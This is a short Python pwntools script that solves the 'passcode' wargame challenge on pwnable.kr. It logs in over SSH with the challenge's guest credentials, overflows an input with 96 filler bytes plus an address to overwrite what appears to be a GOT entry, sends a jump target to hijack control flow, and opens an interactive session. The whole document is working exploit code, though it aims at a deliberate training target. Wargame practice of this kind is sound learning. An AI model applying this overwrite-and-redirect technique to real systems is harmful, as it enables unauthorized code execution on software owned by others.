from pwn import *
import binascii

print "PWN!!!"

#context.binary("./passcode")

r = process("./passcode")
s = ssh(host="pwnable.kr",user="passcode", password="guest",port=2222)
r=s.process("./passcode")

payload = p32(0x0804a004)
#r.sendline('A'*96 + payload + str(0x080485d7))
r.sendline('A'*96 + payload)
r.sendline(str(0x080485d7))

r.interactive()